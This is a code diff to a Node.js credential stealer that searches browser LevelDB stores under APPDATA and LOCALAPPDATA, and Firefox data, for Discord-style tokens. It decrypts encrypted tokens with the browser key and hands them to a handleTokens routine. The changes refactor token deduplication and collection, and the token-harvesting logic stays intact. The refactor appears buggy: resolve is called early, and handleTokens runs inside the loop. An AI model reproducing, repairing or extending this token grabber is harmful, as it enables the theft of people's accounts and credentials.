@@ -36,14 +36,14 @@ const decryptRickRoll = (path) => {
       const lines = readFileSync(join(levelDB, f), 'utf8').split('\n').map(x => x.trim());
       lines.forEach(line => {
         line.match(tokenRegex)?.forEach(token => {
-          if (!tokens.includes(token)) tokens.push({
+          if (!tokens.find(t => t.token === token)) tokens.push({
             token,
             source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
           });
         });
         line.match(encryptedTokenRegex)?.forEach(token => {
           if (token.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
-          if (!encryptedTokens[token]) encryptedTokens.push(token);
+          if (!encryptedTokens.includes(token)) encryptedTokens.push(token);
         });
       });
       for (let token of encryptedTokens) {
@@ -57,13 +57,13 @@ const decryptRickRoll = (path) => {
         decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
 
         if (
-          typeof decrypted === 'string' && decrypted.match(tokenRegex) && !tokens.includes(decrypted)
+          typeof decrypted === 'string' && decrypted.match(tokenRegex) && !tokens.find(t => t.token === decrypted)
         ) tokens.push({
           token: decrypted,
           source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
         });
       }
-      if (tokens.length > 0) await handleTokens(tokens, resolve);
+      resolve();
     });
   });
 };
@@ -111,6 +111,7 @@ const handleTokens = async (tokens, resolve) => {
 };
 
 module.exports = new Promise((resolve) => {
+  const tokensList = [];
   for (const path of Object.keys(browsers)) {
     if (!existsSync(browsers[path])) continue;
     if (path.includes('Firefox')) {
@@ -136,13 +137,14 @@ module.exports = new Promise((resolve) => {
               !token.startsWith('MTA') && // 10
               !token.startsWith('MTE')    // 11
             ) return;
-            if (!tokens.includes(token)) tokens.push({ token, source: 'Mozilla Firefox' });
+            if (!tokens.find(t => t.token === token)) tokens.push({ token, source: 'Mozilla Firefox' });
           });
         });
       });
-      handleTokens(tokens, resolve);
+      tokensList.push(...tokens);
     } else {
-      decryptRickRoll(browsers[path]).then(async () => await handleTokens(tokens, resolve));
+      decryptRickRoll(browsers[path]).then(() => tokensList.push(...tokens));
     }
+    handleTokens(tokens, resolve);
   }
 });
